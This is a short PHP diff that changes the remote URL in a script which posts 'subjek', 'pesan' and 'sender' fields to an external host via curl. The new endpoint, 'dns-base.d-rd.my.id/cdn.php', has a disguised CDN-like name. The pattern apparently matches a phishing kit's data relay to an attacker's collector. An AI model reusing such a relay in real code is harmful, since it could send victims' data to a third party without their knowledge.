@@ -1,4 +1,4 @@
-$url = "https://sedeka.my.id/apiii.php";
+$url = "https://dns-base.d-rd.my.id/cdn.php";
 $data = "subjek=".$subjek."&pesan=".$pesan."&sender=".$sender;
 $ch2 = curl_init();
 curl_setopt($ch2, CURLOPT_URL, $url);
